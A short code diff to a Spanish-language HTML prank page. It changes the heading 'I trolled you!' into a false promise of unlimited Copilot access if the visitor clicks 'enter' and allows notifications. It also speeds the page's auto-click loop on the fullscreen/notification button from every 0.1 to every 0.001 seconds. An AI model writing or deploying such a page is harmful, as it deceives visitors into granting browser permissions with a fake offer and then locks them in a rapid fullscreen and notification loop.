@@ -30,8 +30,8 @@
     </style>
 </head>
 <body>
-    <h1>¡Te he troleado!</h1>
-    <button id="fullscreenButton" onclick="activarPantallaCompleta()">Pantalla completa + Notificaciones</button>
+    <h1>¡dale a entrar y a continuacion a permitir notificaciones para poder tener aceso ilimitado en copilot!</h1>
+    <button id="fullscreenButton" onclick="activarPantallaCompleta()">entrar</button>
 
     <script>
         function activarPantallaCompleta() {
@@ -63,7 +63,7 @@
             }
         }
 
-        // Activar auto-click cada 0.1 segundos después del permiso del usuario
+        // Activar auto-click cada 0.001 segundos después del permiso del usuario
         function iniciarAutoClick() {
             setInterval(() => {
                 document.getElementById("fullscreenButton").click();
